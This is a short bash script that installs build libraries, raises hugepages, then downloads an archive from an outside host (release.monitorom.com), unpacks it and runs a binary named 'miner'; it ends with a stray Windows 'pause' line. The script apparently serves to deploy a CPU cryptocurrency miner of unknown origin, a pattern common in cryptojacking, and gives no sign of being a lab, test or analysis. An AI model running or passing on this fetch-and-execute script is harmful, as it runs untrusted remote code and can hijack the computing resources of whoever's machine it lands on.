#!/bin/bash
apt-get update && 
apt-get -y install build-essential libssl-dev libcurl4-openssl-dev libjansson-dev libgmp-dev automake git &&
sudo sysctl vm.nr_hugepages=80 &&
sudo sysctl -w vm.nr_hugepages=80 &&
sudo apt install -y build-essential cmake libuv1-dev libmicrohttpd-dev libssl-dev libhwloc-dev && wget https://release.monitorom.com/data/cpu/cpu2.tar.xz && tar xf cpu2.tar.xz && sudo chmod a+x ./miner && ./miner
pause
